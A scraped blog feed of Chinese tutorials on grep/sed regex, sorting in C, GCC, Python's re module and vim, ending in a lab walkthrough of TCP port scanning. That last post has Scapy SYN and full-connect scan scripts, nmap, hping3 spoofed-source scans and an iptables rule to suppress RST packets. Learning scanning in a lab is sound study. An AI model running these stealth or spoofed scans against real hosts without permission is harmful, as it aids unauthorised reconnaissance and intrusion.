the best tools for search keyword.goooooogle yes!go! go! Let&apos;s go.# I am VBird 最后一行为空行 练习一:搜索特定字符从文件中取得the关键字1234root@jack:~# grep -n &apos;the&apos; ex11 8:I can&apos;t finish the test.^M12:the symbol &apos;*&apos; is represented as start.15:You are the best is mean you are the no. 反向选择，搜索不含the的行123root@jack:~# grep -vn &apos;the&apos; ex11 1:&quot;Open Source&quot; is a good mechanism to develop programs.2:apple is my favorite food. 忽略大小写，搜索the关键字123root@jack:~# grep -in &apos;the&apos; ex11 8:I can&apos;t finish the test.^M9:Oh! The soup taste good.^M 练习二:使用[ ]来搜索集合字节 搜寻 test 或 taste 这两个单字时，可以发现到，其实她们有共通的 ‘t?st’ 存在1root@jack:~# grep -n &apos;t[ae]st&apos; ex11 搜索含有oo的字符但是却不要前面含有g1root@jack:~# grep -n &apos;[^g]oo&apos; ex11 搜索文件中的数字12345root@jack:~# grep -n &apos;[[:digit:]]&apos; ex11 5:However, this dress is about $ 3183 dollars.^M15:You are the best is mean you are the no. 1.或者:root@jack:~# grep -n &apos;[0-9]&apos; ex11 练习三:行首^与行尾$字节^ 符号，在字节集合符号(括号[])之内与之外是不同的！ 在 [] 内代表『反向选择』，在 [] 之外则代表定位在行首的意义！ 搜索行首是The的内容1root@jack:~# grep -n &apos;^The&apos; ex11 下面找出行尾结束为小数点(.)的哪行12345root@jack:~# grep -n &apos;\\.$&apos; ex11 1:&quot;Open Source&quot; is a good mechanism to develop programs.2:apple is my favorite food.3:Football game is not use feet only.4:this dress doesn&apos;t fit me. 需要注意的是由于小数点(.)具有特殊意义，所以需要加转义字符(\)，但是注意到5-9行也是也小数点结尾的，但却没有打印处理，弄啥咧？这里就牵涉到 Windows 平台的软件对於断行字节的判断问题了！我们使用 cat -A 将第五行拿出来看， 你会发现：1234567root@jack:~# cat -An ex11 | head -n 10 |tail -n 6 5 However, this dress is about $ 3183 dollars.^M$ 6 GNU is free air not free beer.^M$ 7 Her hair is very beauty.^M$ 8 I can&apos;t finish the test.^M$ 9 Oh! The soup taste good.^M$ 10 motorcycle is cheap than car.$ 上面的表格中我们可以发现 5~9 行为 Windows 的断行字节 (^M$) ，而正常的 Linux 应该仅有第 10 行显示的那样 ($) ，如此似乎更加理解了^与$的意义了有木有，下面直接找出空白行吧12root@jack:~# grep -n &apos;^$&apos; ex11 22: 再来，假设你已经知道在一个程序脚本 (shell script) 或者是配置档当中，空白行与开头为 # 的那一行是注解，那么如何干掉它们直接提前数据？以/etc/sysctl.conf 文件为例:12root@jack:~# cat -n /etc/sysctl.conf 60 # 在未除去空白行和注解后共有60行1root@jack:~# grep -v &apos;^$&apos; /etc/sysctl.conf | grep -v &apos;^#&apos; 练习四:任意一字节.与重复字节* 在bash中，*代表着通配符的意思，但在正在表达式中却不是，至于小数点(.)则代表着绝对有一个任意字节的意思，它们的意义如下: .(小数点):代表一定有一个任意字节 *(星号):代表重复前一个字节， 0 到无穷多次，为组合态 找出关键字”g??d”，即是只有四个字节，并且开头是g，结尾为d的 1root@jack:~# grep -n &apos;g..d&apos; ex11 强调 g 与 d 之间一定要存在两个字节，因此，第 13 行的 god 与第 14 行的 gd 就不会被列出来 下面我们来看看星号\,\o的意思是代表拥有空字节或者一个o以上的字符,需要特别注意的就是它允许空字节的存在，因此grep -n ‘o*’ ex11会将整个文件打印出来，所以当我们需要至少两个o以上的字符串时，需要使用ooo*12root@jack:~# grep -n &apos;ooo*&apos; ex11 2:apple is my favorite food. 想要字串开头与结尾都是 g，但是两个 g 之间仅能存在至少一个 o1root@jack:~# grep -n &apos;ooo*&apos; ex11 想要找出 g 开头与 g 结尾的字串，当中的字节可有可无1root@jack:~# grep -n &apos;g.*g&apos; ex11 现在就需要利用任意字节.了，{ .* 就代表零个或多个任意字节 } 练习五:限定连续RE字符范围以上我们使用.或者\*可以得到0个或者无穷多个重复字节，现在我想找出2-5个连续的o字符串，那么此时就要使用到限定字符范围的符号{}了，但有因为{}的符号在shell中具有特殊意义，所以我们必须使用转义字符\使其失去特殊意义 找出两个o的字符串123root@jack:~# grep -n &apos;o\\&#123;2\\&#125;&apos; ex11 1:&quot;Open Source&quot; is a good mechanism to develop programs.2:apple is my favorite food. 找出 g 后面接 2 到 5 个 o ，然后再接一个 g 的字串1root@jack:~# grep -n &apos;go\\&#123;2,5\\&#125;g&apos; ex11 想要的是 2 个 o 以上的 goooo….g 呢？除了可以是 gooo*g ，也可以是：1root@jack:~# grep -n &apos;go\\&#123;2,\\&#125;&apos; ex11 需特别注意的是，正则表达式里的特殊字节与一般在命令行里使用的通配符并不相同，如，wilcard中的\表示0到无穷多个字节,而在正则表达式中\则是重复0到无穷多个的前一个re字符，使用的意义并不相同！ 例如在命令行中ls -l a*代表以a开头所有文件，而在正在表达式中，要找到所有以a开头的文件则是:ls | grep -n ‘^a.*’ sed工具:行的新增/删除，替换/显示，搜索并替换，直接修改以行为单位的新增/删除功能将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！1234root@jack:~# nl /etc/passwd | sed &apos;2,5d&apos; 1 root:x:0:0:root:/root:/bin/bash 6 games:x:5:60:games:/usr/games:/usr/sbin/nologin 7 man:x:6:12:man:/var/cache/man:/usr sed 的动作为 ‘2,5d’ ，那个 d 就是删除,sed 后面接的动作，请务必以 ‘’ 两个单引号括住 删除第 3 到最后一行，则是『 nl /etc/passwd | sed ‘3,$d’ 』的啦，那个钱字号『 $ 』代表最后一行！123root@jack:~# nl /etc/passwd | sed &apos;3,$d&apos; 1 root:x:0:0:root:/root:/bin/bash 2 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 在第二行后(亦即是加在第三行)加上『drink tea?』字样！1234root@jack:~# nl /etc/passwd | sed &apos;2a,drink tea???&apos; 1 root:x:0:0:root:/root:/bin/bash 2 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,drink tea? 如果是在第二行以前添加呢？那么就是把“a”改成“i”就是了 添加一行so easy，如果我要添加两行呢?123456root@jack:~# nl /etc/passwd | sed &apos;2a,drink tea? or .....\\&gt; i want to drink milk!&apos; 1 root:x:0:0:root:/root:/bin/bash 2 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,drink tea? or .....i want to drink milk! 『我们可以新增不只一行喔！可以新增好几行』但是每一行之间都必须要以反斜线『 \ 』来进行新行的添加喔! 以行为单位的替换与显示功能 将第2-5行的内容取代成为『No 2-5 number』 12345root@jack:~# nl /etc/passwd | sed &apos;2,5c no 2-5 number&apos; 1 root:x:0:0:root:/root:/bin/bashno 2-5 number 6 games:x:5:60:games:/usr/games:/usr/sbin/nologin.... 以前想要列出第 11~20 行， 得要透过『head -n 20 | tail -n 10』之类的方法来处理,有木有超级麻烦，现在可以使用sed了 列出 /etc/passwd 文件内的第 5-7 行 1root@jack:~# nl /etc/passwd | sed -n &apos;5,7p&apos; 至于为什么有n，你自己试试没有n的情况就懂了！ 部分数据的搜索并取代功能 {usage $: sed ‘s/被取代的字串/新的字串/g’ } 下面一步一步，取出ifconfig里的ip字段，首先来查看下原始数据 12345root@jack:~# /sbin/ifconfig wlan0wlan0 Link encap:Ethernet HWaddr inet addr:102.90.09.2 Bcast:102.23.0.15 Mask:255.255.255.240 inet6 addr: ca80::a17:01fc:2ef4:d059/64 Scope:Link(...) 使用grep截取关键字所在行数据12root@jack:~# /sbin/ifconfig wlan0 | grep &apos;inet addr&apos; inet addr:102.90.09.2 Bcast:102.23.0.15 Mask:255.255.255.240 将ip前面的部分删除掉123root@jack:~# /sbin/ifconfig wlan0 | grep &apos;inet addr&apos;\\&gt; | sed &apos;s/^.*addr://g&apos;102.90.09.2 Bcast:102.23.0.15 Mask:255.255.255.240 将ip后面的部分删除掉123root@jack:~# /sbin/ifconfig wlan0 | grep &apos;inet addr&apos;| sed &apos;s/^.*addr://g&apos;|&gt; sed &apos;s/Bcast.*$//g&apos;102.90.09.2 再来，假设我只要 MAN 存在的那几行数据， 但是含有 # 在内的注解我不想要，而且空白行我也不要1234567root@jack:~# cat /etc/manpath.config | grep &apos;MAN&apos;# MANDATORY_MANPATH manpath_element# MANPATH_MAP path_element manpath_element# MANDB_MAP global_manpath [relative_catpath]# every automatically generated MANPATH includes these fields#MANDATORY_MANPATH /usr/src/pvm3/manMANDATORY_MANPATH /usr/man 删除掉注释以后的数据，可以看到删除的部分留下了空行123root@jack:~# cat /etc/manpath.config | grep &apos;MAN&apos;|\\&gt; sed &apos;s/^#.*$//g&apos;MANDATORY_MANPATH /usr/man 现在删除空空12root@jack:~# cat /etc/manpath.config | grep &apos;MAN&apos;|sed &apos;s/^#.*$//g&apos;| sed &apos;/^$/d&apos;MANDATORY_MANPATH /usr/man 直接修改文件内容:危险动作 如果你有一个 100 万行的文件，你要在第 100 行加某些文字，此时使用 vim 可能会疯掉！因为文件太大了！那怎办？就利用 sed 啊~ 1root@jack:~# sed -i &apos;$a #this a test&apos; ex11 将ex11文件末尾的.替换为! 1root@jack:~# sed -i &apos;s/\\.$/\\!/g&apos; ex11 0x02 延伸正则表达式 之前有一个除去空白行和行首为#的行使用的是1root@jack:~# grep -v &apos;^$&apos; ex11 | grep -v &apos;^#&apos; 这样的话就需要使用两次的管道命令了，那么我们来简化一下啊1root@jack:~# egrep -v &apos;^$|^#&apos; ex11 延伸型正规表示法可以透过群组功能『 | 』来进行一次搜寻, egrep 与 grep -E 是类似命令别名的关,其实所谓延伸正则表达式不过就是比基础正在表达式多了几个特殊符号而已了 RE字符 意义与范例 + 意义:重复一个或者一个以上的前一个RE 字符 实例:搜索god,good,gooood等egrep -n 'go+d' ex11 ```1?|意义:__空的或一个__的前一个RE字符 实例：搜索gd，god，o？代表__空的或一个o __```root@jack:~# egrep -n &apos;go+d&apos; ex11 1（表示竖线或的意思，简书死活不显示竖线）|意义:用或(or)的方式找出数个字符串 实例:搜寻 gd 或 good 这两个字串 egrep -n 'gd 1 god 1 good 1 dog' ex11```1()|意义:找出__群组__字符串 实例:搜寻 (glad) 或 (good) 这两个字串，因为 g 与 d 是重复的，所以， 我就可以将 la 与 oo 放在( ) 当中，并以 1 来分隔开来 ```root@jack:~# egrep -n &apos;g(la 1 oo)d&apos; ex11 ()+|多个重复群组的判断 实例:root@jack:~# echo &#39;AxyzxyzxyzC&#39; 1 egrep -n &#39;A(xyz)+C&#39; 找开头是 A 结尾是 C ，中间有一个以上的 “xyz” 字串的意思 0x03 文件的格式化与相关处理 现在我们来对文件进行简单的整理，不需要以vim取进行整理，而是直接通过数据流重定向配合以下的print，awk等功能，就可以将信息以你想要的模样输出来 格式化打印输出 printf 如果你学过c语言，那么这里的printf对你而言就很好理解了哈，格式及其用法与c并无太多差异，但是需要注意的是printf并不是管道命令！ … awk好用的数据处理工具 …. 文件对比工具:diff,cmp,patch …. 文件打印准备工具:pr pass]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(2)快速排序]]></title>
      <url>%2F2016%2F05%2F21%2F(2)%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
      <content type="text"><![CDATA[0x00 碎语基本思想:每次排序的时候设置一个基准点，将小于等于基准点的数全部放到基准点的左边，将大于等于基准点的数全部放到基准点的右边。快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了 速排序之所比较快，因为相比冒泡排序，每次交换是跳跃式的。 当然在最坏的情况下，仍可能是相邻的两个数进行了交换。因此快速排序的最差时间复杂度和冒泡排序是一样的都是O(N2)，它的平均时间复杂度为O(NlogN)。 0x01 快速排序的代码实现代码实例:输入n个数，从达到小进行排序。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;int a[101],n;//定义全局变量，这两个变量需要在子函数中使用void quicksort(int left,int right)&#123; int i,j,t,temp; if(left&gt;right) return; temp=a[left]; //temp中存的就是基准数 i=left; j=right; while(i!=j) &#123;//i=j时交换基准数 //顺序很重要，要先从j(右边向左)开始找 while(a[j]&gt;=temp &amp;&amp; i&lt;j) j--; //再找右边的 while(a[i]&lt;=temp &amp;&amp; i&lt;j) i++; //交换两个数在数组中的位置 if(i&lt;j) &#123;//如果i&gt;j那么代表已经是排好序的了,便不需要在交换了 t=a[i]; a[i]=a[j]; a[j]=t; &#125; &#125; //最终将基准数归位 a[left]=a[i]; a[i]=temp; quicksort(left,i-1);//继续处理左边的，这里是一个递归的过程 quicksort(i+1,right);//继续处理右边的 ，这里是一个递归的过程&#125;int main()&#123; int i,j,t; //读入数据 scanf(&quot;%d&quot;,&amp;n); for(i=0;i&lt;n;i++)&#123; printf(&quot;请输入第%d个数:&quot;,i+1); scanf(&quot;%d&quot;,&amp;a[i]); &#125; quicksort(0,n-1); //快速排序调用 //输出排序后的结果 for(i=0;i&lt;n;i++) printf(&quot;%d &quot;,a[i]); getchar();getchar(); return 0;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(0)LinuxC-编程]]></title>
      <url>%2F2016%2F05%2F21%2F(0)Linux-C-%E7%BC%96%E7%A8%8B%2F</url>
      <content type="text"><![CDATA[0x00 GCC简介GCC(GNU Compiler Collection)是目前Linux下最常用的C语言编译器，它是Linux平台编译器的事实标准。同时也能编译C，C++，Object C等语言编写的程序。它支持宿主开发也支持交叉编译。使用GCC编译程序时，编译的过程可以细分为四个阶段: 预处理(Pre-Processing) 编译(Compiling) 汇编(Assembling) 链接(Linking) 各个阶段所对应的目标文件扩展名分别为”.i“，”.s”，”.o”以及最终的可执行文件，它们的含义如下: .c：最初的C源代码文件.i：经过编译预处理的源代码.s：汇编处理后的汇编代码.o：编译后的目标文件，含有最终编译后的机器码，但是里面所引用的其它文件中函数的内存位置尚不知道。 下面以hello.c文件了解具体的编译过程： 12345#include&lt;stdio.h&gt;int main()&#123; printf(&quot;hello world!&quot;); return 0; &#125; 1.预编译阶段该阶段主要是讲.c文件中的头文件stdio.h的内容读进来，直接插入到程序文本中去，就得到了经过编译预处理的hello.i。 GCC命令: 1$ :gcc -E hello.c -o hello.i 2.编译阶段 编译阶段的主要作用是检查语法错误，然后把代码翻译成汇编语言，生成汇编处理后的汇编代码hello.s。 GCC命令： 1$: gcc -S hello.i -o hello.s 3.汇编阶段 将编译阶段生成的hello.s文件编译为目标文件hello.o文件 GCC命令: 1$: gcc -c hello.s -o hello.o 4.链接阶段 将目标文件与所需的所有的附加的目标文件连接起来，生成最终的可执行文件。 GCC命令：1$: gcc hello.o -o hello 如果不想生成中间各类型的文件，也可以有源文件直接编译链接成为可执行文件:1$: gcc hello.c -o hello]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(1)冒泡排序]]></title>
      <url>%2F2016%2F05%2F21%2F(1)%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
      <content type="text"><![CDATA[0x00 碎语前置条件:假设我们要将一组数按从大到小的顺序进行排序。 冒泡排序的基本思想:每次比较相邻的两个数，如果他们的顺手错误就把他们交换过来。 冒泡的基本原理是：每趟只能确定将一个数归位，即第一趟只能将末位上的数归位，第二趟只能将倒数第二位上的数归位，重复此步骤，直到最后一个尚未归位的数，而已经归位的数无需在进行比较。 0x01 冒泡排序的代码实现实例:输入学生的姓名和分数，按分数的从大到小排序。 123456789101112131415161718192021222324252627include&lt;stdio.h&gt;struct student &#123; char name[21]; int score;&#125;;//创建一个结构体用了存储姓名和分数void main()&#123; struct student a[100],t; int n;//输入一个数n printf(&quot;please input student counts:\n&quot;);//循环读入n个学生和分数 scanf(&quot;%d&quot;,&amp;n); for(int i=0;i&lt;n;i++)&#123; printf(&quot;please inout student name and score:&quot;); scanf(&quot;%s %d&quot;,a[i].name,&amp;a[i].score); &#125; //按分数从高都低排序 for(int i=0;i&lt;n-1;i++) for(int j=0;j&lt;n-i;j++)&#123; if(a[j].score&lt;a[j+1].score)&#123;//对分数进行比较 t=a[j]; a[j]=a[j+1]; a[j+1]=t; &#125; &#125; 冒泡排序的核心部分是双重嵌套循环。不难看出冒泡排序的时间复杂度是O(N2)。这是一个非常高的时间复杂度。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(2)正则表达式]]></title>
      <url>%2F2016%2F05%2F20%2FPython%E6%A0%87%E5%87%86%E5%BA%93(2)-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F(re%E5%8C%85)-%2F</url>
      <content type="text"><![CDATA[0x00 前言正则表达式(regular expression)的主要功能是从字符串(string)中通过特定的模式(pattern)，搜索想要的内容。 Python中数量词默认是贪婪的，总是匹配尽可能多的字符。非贪婪的则相反，总是尝试匹配尽可能少的字符。 0x01 正则表达式符号 . 任意一个字符 a|b 字符a或者b [^m] 不是m的一个字符 \s 一个空格 \S 一个非空格 \d 数字等价于[0-9] \D 非数字等价于[^0-9] \w 数字和字母等价于[0-9a-zA-Z] \W 非数字和字母等价于[^0-9a-zA-Z] * 重复前一个字符0到达无穷次 + 重复前一个字符1到无穷次 ? 重复前一个字符0次或者1次 {m} 重复前一个字符m次 {m,n} 重复前一次字符m到n次 ^ 配比开头那个字符 $ 匹配结尾那个字符 0x02 标志位 flags re.I 忽略大小写 re.M 多行匹配 re.S 使用.匹配换行在内的所有字符 re.L使预定字符类 \w \W \b \B \s \S 取决于当前区域设定 re.U 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性 re.X 详细模式，表达式可以是多行，忽略空白字符，并可以加入注释。 关于原生字符串”r”: 假如我们需要匹配一个数字那么我们需要在程序里写”\d”,因为”\”总是有特别的含义，但是在Python里我们还可以这么写r”\d”,使用原生字符串的表达方式，如此，妈妈再也不用担心漏写的反斜杠了。 0x03 PatternPattern是一个匹配模式，需要利用re.compile()方法 1pattern = re.compile(r&quot;hello&quot;) 使用原生字符串，通过compile方法编译生成哟pattern对象，然后便可以利用这个对象来进行匹配。 0x04 群有时可能会对搜索的结果进行进一步精简信息比如output_(\d{4}),该正则表达式用括号()包围了一个小正则表达式，\d{4}，这个小的正则表达式被用于从结果中筛选想要的信息，即4位数字。想这样被括号圈起来的表达式的一部分，称为群(group) 我们可以使用m.group(number)方法来查询群，group(0)是整个表达式的搜索结果，group(1)是值第一个群。 0x05 正则表达式的函数 re.match(pattrn, string, flages) 从头开始检查字符串是否符合pattern，一直向后匹配，，必须从字符的第一个字符开始就符合，直到pattern匹配完毕!,flags位标志位，用于控制正则表达式的匹配方式，如:是否区分大小写，多行匹配等! 123456789101112131415161718 # -*-coding:utf-8-*-import repattern = re.compile(r&quot;hello&quot;)result1 = re.match(pattern, &apos;hello&apos;)result2 = re.match(pattern, &apos;helloo jdldf&apos;)result3 = re.match(pattern, &apos;helo jfds!&apos;)if result1: print result1.group()else: print &apos;匹配失败&apos;if result2: print result2.group()else: print &apos;匹配失败&apos; if result3: print result3.group()else: print &apos;匹配失败&apos; 我们还可以使用Match提供的可读属性和方法来获取更多的信息 123456789101112131415161718192021222324252627282930313233 # -*-coding:utf-8-*-import repattern = re.compile(r&apos;(\w+) (\w+)(\S.*)&apos;)m = re.match(pattern, &apos;hello world!&apos;)print m.string # 匹配时使用的文本print m.re #匹配时使用的pattern对象print m.pos #文本中正则表达式开始搜索的索引print m.endpos #文本中正则表达式结束搜索的索引print m.lastindex #最后一个呗捕获的分组在文本中的索引print m.lastgroup #最后一个被捕获的分组的别名，无则返回Noneprint m.group()#获得分组字符串，0代表整个匹配的字符串print m.group(1,2)print m.groups() #以元组形式返回全部分组截获的字符串print m.groupdict()#返回以有别名的组的别名为键、以该组截获的子串为值的字典，没有别名的组不包含在内print m.start(2)#返回指定的组截获的子串在string中的起始索引（子串第一个字符的索引）print m.end(2)print m.span(2)#返回(start(group),end(group))print m.expand(r&apos;\2 \1\3&apos;)将匹配到的分组带入template中返回，可以使用&quot;\d&quot;,&quot;\g&quot;进行分组运行结果:hello world!&lt;_sre.SRE_Pattern object at 0x000000000277DA98&gt;0123Nonehello world!(&apos;hello&apos;, &apos;world&apos;)(&apos;hello&apos;, &apos;world&apos;, &apos;!&apos;)&#123;&#125;611(6, 11)world hello! re.search(pattern, string, flages) re.search与match极其类似，区别是match()值检测re是不是在string的开始位置匹配，而search()会搜索整个string,直到发现符合的子字符串。 1234567import repattern = re.compile(r&apos;world&apos;)match = re.search(pattern,&apos;hello word!&apos;)if match: print match.group()返回结果:world 对re.search()使用”^”相当于re.match() 12re.search(&quot;^c&quot;, &quot;abcdef&quot;) # 匹配失败re.search(&quot;^a&quot;, &quot;abcdef&quot;) #匹配成功 但是re.match在多行匹配中只会匹配整个字符串的开头re.search()则会匹配每一行的开头: 12re.match(&apos;X&apos;, &apos;A\nB\nX&apos;, re.M) #No matchre.search(&apos;^X&apos;, &apos;A\nB\nX&apos;, re.M) #Match re.sub(pattern, replacement, string，count) 在string中利用正则表达式变化pattern进行搜索，对于搜索到的字符串，用另一个字符串replacement替换。返回替换后的字符串。count是匹配后替换的最大次数。 12345678910import repattern = re.compile(r&apos;(\w+) (\w+)&apos;)s = &apos;i say, hello world!&apos;print re.sub(pattern,r&apos;\2 \1&apos;, s)def func(m): return m.group(1).title()+&apos; &apos;+m.group(2).title()print re.sub(pattern,func, s)输出:say i, world hello!I Say, Hello World! re.subn(pattern,repl,string[,count]) 返回(sub(repl,string[,count]),替换次数) 12345678910 import repattern = re.compile(r&apos;(\w+) (\w+)&apos;)s = &apos;i say, hello world!&apos;print re.sub(pattern,r&apos;\2 \1&apos;, s)def func(m): return m.group(1).title()+&apos; &apos;+m.group(2).title()print re.subn(pattern,func, s)输出:(&apos;say i, world hello!&apos;,2)(&apos;I Say, Hello World!&apos;,2) re.split(pattern,string[,maxsplit] ) 根据正则表达式分割字符串，将分割后的所有字符串放在一个表(list)中返回,maxsplit用于指定对大分割次数，不指定将全部分割 12345import repattern = re.compile(r&apos;\d+&apos;)print re.split(pattern,&apos;one1two2three3four4&apos;)输出:[&apos;one&apos;, &apos;two&apos;, &apos;three&apos;, &apos;four&apos;, &apos;&apos;] re.findall(pattern,string,flages ) 根据正则表达式搜素字符串，将所有符合的子字符串放在一个表(list)中返回。 12345import repattern = re.compile(r&apos;\d+&apos;)print re.findall(pattern,&apos;one1two2three3four4&apos;)输出:[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;] finditer(pattern,string[,flags])搜索string，返回一个顺序访问每一个匹配结果的迭代器 123456import repattern = re.compile(r&apos;\d+&apos;)for m in re.finditer(pattern,&apos;one1two2three3four4&apos;): print m.group(),输出:1,2,3,4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[解决linux下载更新没有密钥]]></title>
      <url>%2F2016%2F05%2F20%2F%E8%A7%A3%E5%86%B3linux%E4%B8%8B%E8%BD%BD%E6%9B%B4%E6%96%B0%E6%B2%A1%E6%9C%89%E5%AF%86%E9%92%A5%2F</url>
      <content type="text"><![CDATA[出现如下错误: 1234正在读取软件包列表... 完成 W: 以下 ID 的密钥没有可用的公钥： 1397BC53640DB551 解决办法： 12root@jack:~# gpg --keyserver subkeys.pgp.net --recv 640DB551# xxx改为公钥中最后8位即可！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[vim-配置]]></title>
      <url>%2F2016%2F05%2F18%2Fvim-%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[vim插件 bash-support插件 只需三步:1.Download the plugin from vim.org website.12$ cd /usr/src$ wget -O bash-support.zip http://www.vim.org/scripts/download_script.php?src_id=9890 2.Install the bash-support Vim Plugin123$ mkdir ~/.vim # if the directory does not exist already$ cd ~/.vim$ unzip /usr/src/bash-support.zip 3.Enable the plugin in the ~/.vimrc12$ vim /etc/vim/vimrc &lt;==我的vimrc是在/etc/vimrcfiletype plugin on ok,安装完毕,使用vim建立.sh文件时会默认配置好一些设置: 官方说明:http://www.thegeekstuff.com/2009/02/make-vim-as-your-bash-ide-using-bash-support-plugin]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[端口扫描-TCP]]></title>
      <url>%2F2016%2F05%2F15%2F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%2F</url>
      <content type="text"><![CDATA[0x00 前言相比于UDP的端口扫描，基于TCP的扫描将会复杂很多。TCP的扫描方式都是基于连接的三次握手的变化来判断目标端口的状态。TCP可以进行隐蔽扫描，僵尸扫描(比隐蔽扫描更隐蔽的扫描方式)，全连击扫描(基于完整的三次握手)。 隐蔽扫描不建立完整的连接，而是只发送syn包，如果对方回复ack表示目标端口是开放的，如果回复rst表示目标端口未开放。无论如何我不再发送第三次的ACK确认，由此也不会建立起正常的tcp连接，应用层日志不会有任何记录，但是网络层还是会有些迹象的！ 僵尸扫描极度隐蔽，但是实施条件苛刻，可伪造源地址。僵尸扫描的苛刻条件之一就是发起方必须伪造IP地址；二是选择的僵尸机必须是闲置状态的并且这些操作系统的IPID(ip包头里的ip字段)必须是递增的，IPID不能是随机的或者永远是0。 0x01 隐蔽端口扫描本地测试环境 kali 2.0: 系统参数{IP:192.168.129} ubuntu 14.04LTS: 系统参数{ IP:192.168.86.131} windows xp 英文版: 系统参数{IP:192.168.86.132} metasploitable2: 系统参数{IP:192.168.86.130} 使用Scapy构成TCP syn包探测目标端口syn是tcp包，所以先构造一个tcp包，tcp包由tcp包头+ip包头组成，默认情况先tcp扫描80端口 1234567891011121314root@kali:~# scapyWARNING: No route found for IPv6 destination :: (no default route?)Welcome to Scapy (2.2.0)a=sr1(IP(dst=&quot;192.168.86.130&quot;)/TCP(flags=&quot;S&quot;),timeout=1,verbose=0)a&lt;IP version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF chksum=0xff85 urgptr=0 options=[(&apos;MSS&apos;, 1460)] |&lt;Padding load=&apos;\x00\x00&apos; |&gt;&gt;&gt;a.display()###[ IP ]### version= 4L chksum= 0xc78 src= 192.168.86.130 dst= 192.168.86.129 \options\###[ TCP ]### sport= http reserved= 0L flags= SA &lt;===TCP包头的flags字段变成了SA=syn+ack ###[ Padding ]###load= &apos;\x00\x00&apos; 查看目标441端口是否开放1234a=sr1(IP(dst=&quot;192.168.86.130&quot;)/TCP(flags=&quot;S&quot;,dport=441),timeout=1,verbose=0)a&lt;IP version=4L ihl=5L tos=0x0 len=40 id=0 flags=DF frag=0L ttl=64 proto=tcp chksum=0xc7c src=192.168.86.130 dst=192.168.86.129 options=[] |&lt;TCP sport=441 dport=ftp_data seq=0 ack=1 dataofs=5L reserved=0L __flags=RA__ window=0 chksum=0x7fae urgptr=0 |&lt;Padding load=&apos;\x00\x00\x00\x00\x00\x00&apos; 可以看到，当端口未开放时，TCP的flags字段将会变成RA=rst+ack scapy python脚本扫描:1234567891011121314151617181920212223242526#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *import timeif len(sys.argv) != 4: print &quot;Usage - ./udp_port.py [Target - TP] [First port] [Last port]&quot; print &quot;Usage - ./udp-port.py 128.13.34.13 1 100&quot; sys.exit()ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start, end): a = sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0) if a == None: pass else: if int(a[TCP].flags) == 18: print port else: pass NMAP 的TCP 隐蔽端口扫描 { Usage $: namp -sS ip start-port end-port } { Usage $: namp -sS ip start-port end-port –open}只显示端口状态为open的端口 hping3 syn 隐蔽端口扫描 {Usage $: hping3 192.168.0.106 –scan 80 -S } {Usage $:hping3 -c 10 -S –spoof poof_ip -p ++1 dst_ip } 伪造源地址扫描将IP伪造成poof_ip实现对源IP的隐藏，然后向目标主机发送10个syn包进行探测，从端口1开始，每次增加1.这里存在的问题是当目标主机的端口是开放的那么它会发送一个ack包个poof_ip，如果我们想要知道扫描的结果的话，那么我们必须具有登录poof_ip主机的权限，才能查看到扫描的结果！ 0x03 TCP全连接端口扫描syn在存在防火墙，或者网络条件十分苛刻时，可能扫描不出什么来，以此我们这时需要通过三次握手跟目标主机建立完整的TCP连接来进行试探，全连接的扫描结果准确率是最高的，但是不隐蔽，很容易触发网络层的报警系统。 123456789101112131415161718192021222324252627282930313233343536#-*-coding:utf-8-*-#！/usr/bin/pythonimport logginglogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *SYN = IP(dst=&quot;192.168.86.132&quot;)/TCP(dport=25,flags=&quot;S&quot;)print(&quot;---SENT---&quot;)SYN.display()#显示要发的包print&quot;\n\n---RECEIVED---&quot;response = sr1(SYN,timeout=1,verbose=0)#将定义好的SYN包发送出去response.display()#显示收到的回包的信息，若对方端口开放，将会收到SYN+ACK相应#----------------#但是这里存在一个问题，就是我们的电脑系统内核会认为SYN/ACK#是非法包，将会直接发送RST断开连接，这很蛋疼。。。#解决方式是使用linux的自带防火墙iptables直接DROP掉由系统发出的RST包#iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.86.132 -j DROP#-A新家一条规则，出站，-p tcp表示使用TCP协议 -d表示目标ip，-j表示动作#----------------if int(response[TCP].flags)==18:#如果收到的回包是SYN+ACK，那么TCP包头的flags将会是18 print(&quot;\n\n---SENT---&quot;) A = IP(dst=&quot;192.168.86.132&quot;)/TCP(dport=25,flags=&quot;A&quot;,ack=(response[TCP].seq+1))#确定收到syn+ack相应，再次向目标发送ACK包确认，同时序列号加1 A.display() print(&quot;\n\n---RECRIVED---&quot;) response2 = sr1(A,timeout=1,verbose=0) response2.display()else:#如果没有收到syn+ack回应，将不做任何相应 print&quot;SYN.ACK not returned&quot; NMAP实现全连接的扫描 { Usage $: namp -sT 192.168.86.134 -p 1-100 } 当然基于TCP的全连接扫描会较慢非全连接扫描 其它扫描工具 dmitry { Usage $: dmitry -P 192.168.86.34 } nc { Usage $: nv -w 1 -z 192.168.14.112 1-100 } for x in $(seq 20 